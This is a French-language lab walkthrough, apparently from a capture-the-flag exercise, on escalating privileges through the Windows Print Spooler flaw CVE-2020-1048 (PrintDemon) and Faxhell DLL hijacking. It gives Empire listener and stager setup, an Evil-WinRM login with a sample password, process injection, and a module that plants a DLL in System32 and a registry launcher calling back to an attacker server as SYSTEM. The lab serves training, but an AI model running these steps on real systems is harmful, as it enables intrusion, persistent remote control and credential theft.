# DLL Hijacking

Invoke-PrintDemon tire parti de deux vulnérabilités différentes : Faxhell et PrintDemon. Le premier est un détournement de DLL de la DLL ualapi lorsque le service de fax est en cours d'exécution (Faxhell).

Les vulnérabilités de détournement de DLL se produisent lorsqu'un programme tente de charger une DLL à partir d'un emplacement et ne peut pas la trouver. Comme indiqué ci-dessus, le service de télécopie ne trouve pas la DLL ualapi lorsqu'il essaie de la charger. Le service de télécopie s'exécute en tant que SYSTEM, donc tout code exécuté à partir de la DLL s'exécutera dans un contexte élevé. Cependant, nous devons écrire dans le dossier privilégié C:\Windows\System32 pour pirater la DLL.

CVE-2020-1048 nous permet d'écrire arbitrairement n'importe où sur le disque. Le post lié à la vulnérabilité est un peu obtus mais fonctionne grâce à trois concepts principaux.

1.) Un port d'imprimante ne doit pas nécessairement être un port réel, mais peut être un emplacement de fichier. Réfléchissez à la façon dont vous pouvez imprimer des fichiers au format PDF. Cela passe toujours par un "port d'imprimante" mais écrit dans un fichier.

2.) Le service Print Spooler crée un fichier de travail fantôme afin que l'imprimante puisse récupérer le travail en cas d'interruption inattendue du service.

3.) Lorsqu'un travail d'impression est lancé, il hérite du privilège de l'utilisateur qui demande le travail.

Ainsi, au départ, lorsque nous demandons un travail d'impression, il ne dispose que de nos autorisations utilisateur standard. Cependant, le fichier de travail reflet n'est associé à aucun contexte utilisateur. Cela signifie que lorsque le service Spooleur d'impression est redémarré et lance un travail à partir du fichier fantôme et hérite des autorisations du service Spooleur d'impression, qui s'exécute en tant que SYSTEM !

C'est beaucoup de choses compliquées qui sont expliquées dans un court paragraphe, donc la clé à retenir est que CVE-2020-1048 nous permet de dire à Print Spooler d'écrire dans n'importe quel fichier arbitraire. Tant que nous pourrons redémarrer le service Spooler, nous aurons les autorisations nécessaires même en tant qu'utilisateur de bas niveau. Heureusement, les travaux d'impression survivent aux redémarrages et le redémarrage de l'ordinateur est autorisé par n'importe quel utilisateur.

---

## Installation des outils


**Empire** 

Empire 3 est un framework de post-exploitation qui inclut un agent Windows pur PowerShell et une compatibilité avec les agents Python 3.x Linux/OS X. Il s'agit de la fusion des précédents projets PowerShell Empire et Python EmPyre. Le cadre offre des communications cryptologiquement sécurisées et une architecture flexible.

**Installation**

<img src="https://www.bc-security.org/wp-content/uploads/2020/09/empire3.4.jpg"/>

**Kali**

1.) ```sudo apt install powershell-empire```


**GitHub**

1.) ```git clone https://github.com/BC-SECURITY/Empire.git```

2.) ```cd Empire```

3.) ```sudo ./setup/install.sh```

! Lancer le serveur empire sur une fenêtre, et le client sur une autre.

**Evil-WinRM**

WinRM (Windows Remote Management) est l'implémentation Microsoft du WS-Management Protocol. Un protocole standard basé sur SOAP qui permet au matériel et aux systèmes d'exploitation de différents fournisseurs d'interagir. Microsoft l'a inclus dans ses systèmes d'exploitation afin de faciliter la vie des administrateurs système. Evil-WinRM est le shell WinRM ultime pour le piratage/pentesting.

<img src="https://1.bp.blogspot.com/-4qQ6pwAqaJs/Xdgggyf61vI/AAAAAAAADjw/HjBZs9nNu8cuhfvqWGosM4ZbLb2jtmBMwCLcBGAsYHQ/s1600/Documentation-1%25281%2529.png"/>

1.) git clone https://github.com/Hackplayers/evil-winrm.git

2.) cd evil-winrm

3.) gem install evil-winrm

---

## Windows Remote Management

La gestion à distance de Windows (WinRM) peut être utilisée pour se connecter à un compte de niveau utilisateur. Quelques méthodes existent pour déployer un agent Empire, nous vous recommandons d'utiliser Evil-WinRM pour vous connecter à la box cible, puis d'ajouter une session multi/lanceur à Evil-WinRM. (Nous verrons comment construire le lanceur dans les prochaines tâches).

1.) `evil-winrm -i <IP_ADDRESS> -u <USERNAME> `
  
`Login: Sam`

`Password: azsxdcAZSXDCazsxdc`

---

## Empire Agent

Pour créer un Listener Empire, exécutez les commandes suivantes :

1.) `uselistener http`

2.) `set Host <Host IP> `

3.) `set Port <Port Number>`

4.) `execute`

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/listener.jpg"/>


Revenez au menu principal en tapant main et créez une étape Empire :

1.) `usestager multi/launcher`

2.) `set Listener http`

3.) `execute`

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/usestager.jpg"/>

---

## Deploiement de l'agent

Evil-WinRM donne accès à une invite PowerShell pour lancer des commandes. Cela donne quelques options différentes pour livrer votre charge utile (par exemple, bat, exe, wget). Vous pouvez choisir celui que vous voulez, sinon, la solution la plus simple est de lancer le one-liner directement dans la fenêtre Evil-WinRM.

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/evil-winrm.jpg"/>
---

## Lancement d'un Process

La session lancée depuis Evil-WinRM a des limitations avec PowerShell. Vous devrez créer un nouveau processus avec Empire pour pouvoir continuer l'exercice. Tout d'abord, recherchez un nouveau processus vers lequel migrer à l'aide de Get-Process (alias ps). En règle générale, vous souhaiterez viser un processus commun qui soit stable et ne sera pas fermé par un utilisateur (par exemple, un explorateur).

- Pour lier votre session Empire avec la session EvilWin-Rm utilisez la commande `interact`

1.)  ps

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/ps_dllhijacking.jpg"/>

Après avoir sélectionné un processus, vous exécuterez 
`psinject <listenername> <processid> `
Cette commande lancera un nouvel agent qui s'exécute localement et non via une session distante.

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/psinject_explorer.jpg"/>

---

## System Check

Maintenant que nous avons établi un point d'ancrage sûr, nous voulons obtenir des privilèges de niveau supérieur. CVE-2020-1048 signifie que les systèmes non corrigés avant Windows build 2004 sont vulnérables à une vulnérabilité d'écriture arbitraire n'importe où et au détournement de DLL par le biais d'une utilisation abusive de l'imprimante.

<img src="https://windows-internals.com/wp-content/uploads/2020/05/spooler-queue.png"/>

Vérifiez le numéro de version de Windows :  

Dans Evil-WinRM : 

1.) `Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId` 

Si la version est inférieure à une version de Windows 10, essayez d'utiliser le module Invoke-Printdemon dans Empire.

Quel est le numéro de build de Windows ?
```
réponse 
```

---

## Invore PrintDemon

- Invoke-PrintDemon est un PoC d'implémentation de PowerShell Empire utilisant PrintDemon et Faxhell.  
- Le module contient déjà la DLL Faxhell, qui exploite CVE-2020-1048 pour l'élévation des privilèges.  
- La vulnérabilité permet à un utilisateur non privilégié d'obtenir des privilèges au niveau du système via le spooleur d'impression Windows.  
- Le module imprime une DLL nommée ualapi.dll, qui est chargée dans System32. Le module place ensuite un lanceur dans le registre, qui exécute le code en tant que SYSTEM au redémarrage.

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/printdemon.jpg"/>

Remarque : vous devrez utiliser le lanceur codé en Base64 pour exécuter Invoke-PrintDemon.

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/stager.jpg"/>

1.) `usemodule privesc/printdemon`

2.) `set LauncherCode <Base64 Encoded Launcher>`

Si Invoke-PrintDemon a réussi, vous recevrez les messages suivants. 
(Dans la section suivante, vous redémarrerez la machine puisque le lanceur est écrit dans le registre pour la persistance.)

<img src="https://www.bc-security.org/wp-content/uploads/2019/05/printdemon_resp.jpg"/>

---

## Network Persistence

Comme mentionné au début, pour que notre travail d'impression ait les privilèges d'écrire sur System32, nous devons redémarrer le service Print Spooler.  
Il s'agit d'un processus protégé, la chose la plus simple à faire est donc de redémarrer la machine. Au redémarrage, notre DLL malveillante sera écrite dans System32.   
Notre script est ensuite écrit dans le registre et déclenchera le service Fax pour initier un agent de niveau SYSTEM pour rappeler notre serveur Empire.

<img src="https://user-images.githubusercontent.com/20302208/82018233-b6a83280-9639-11ea-8db0-28a82a5eb5d7.gif"/>

Redémarrez la machine et savourez la victoire !

1.) `shell restart-computer -force`

Alternativement :

2.) `usemodule management/restart`

Quel est le nom de la DLL écrite dans System32 ?
```
reponse
```

---

## Bonus 1 : Trouver d'autres Users

Farfouillez dans le système et trouvez si quelqu'un d'autre utilise cette machine.

Quel est l'autre utilisateur sur la machine ?
```
reponse
```

---


## Bonus 2 : Récupérer les crédentiels Admin

A vous de jouer ! 

---

